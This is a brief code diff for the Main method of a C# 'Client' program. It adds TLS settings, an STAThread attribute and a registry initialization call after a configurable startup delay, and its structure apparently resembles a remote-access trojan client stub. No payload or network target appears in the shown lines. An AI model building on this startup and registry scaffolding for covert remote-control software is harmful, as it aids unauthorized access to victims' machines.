@@ -3,19 +3,28 @@ using Client.Connection;
 using Client.Install;
 using System;
 using Client.Helper;
+using System.Net;
+using System.Windows.Forms;
 
 namespace Client
 {
     public class Program
     {
+        [STAThread]
         public static void Main()
         {
+            // SSL
+            ServicePointManager.Expect100Continue = true;
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+            ServicePointManager.DefaultConnectionLimit = 9999;
+
             for (int i = 0; i < Convert.ToInt32(Settings.De_lay); i++)
             {
                 Thread.Sleep(1000);
             }
 
             if (!Settings.InitializeSettings()) Environment.Exit(0);
+            SetRegistry.InitRegistry();
             try
             {
                 
